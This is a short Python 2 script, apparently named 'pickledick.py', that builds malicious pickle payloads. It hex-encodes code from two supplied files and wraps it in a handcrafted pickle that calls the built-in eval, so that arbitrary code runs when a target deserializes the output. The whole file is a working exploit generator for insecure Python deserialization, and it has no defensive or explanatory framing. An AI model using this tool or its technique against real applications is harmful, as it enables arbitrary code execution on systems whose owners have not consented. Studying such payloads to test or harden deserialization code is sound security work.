#!/usr/bin/python
#
# Takes two python files (a defintion of classes and functions and an
# expression file) and echos to stdout a specially crafted pickle object that
# will execute the supplied code when unpickled.
#

import fileinput
import pickle
import sys

if len(sys.argv) != 3:
  print "usage: pickledick.py definitions.py value.py"
  print "\nDefine any classes and functions that will be used in definitions.py."
  print "value.py must contain a single expression that will be the result of the unpickling."
  print "\nNote: You will not have access to the unpickling codes global or local variables."
  exit(1)

def_file = sys.argv[1]
val_file = sys.argv[2]

def getHex(i):
  r = hex(i)[2:]
  if( len(r) == 1 ):
    r = "0"+r
  return r

def encode(s):
  return reduce(lambda x,y: x+"\\x"+getHex(ord(y)), list(s), "")

def encodeFile(f):
  res = ""
  for line in file(f):
    res += encode("\n"+line)
  return res

#build the payload code
def_code = "eval(compile('" + encodeFile(def_file)+ "','','exec'))"
val_code = "eval(compile('" + encodeFile(val_file)+ "','','eval'))"
code = "["+def_code+","+val_code+"].pop()"

#get the pickeled string representation
payload = pickle.dumps(code)[0:-4]

#echo out the pickled code
print "c__builtin__\neval\n(" + payload + "tR."
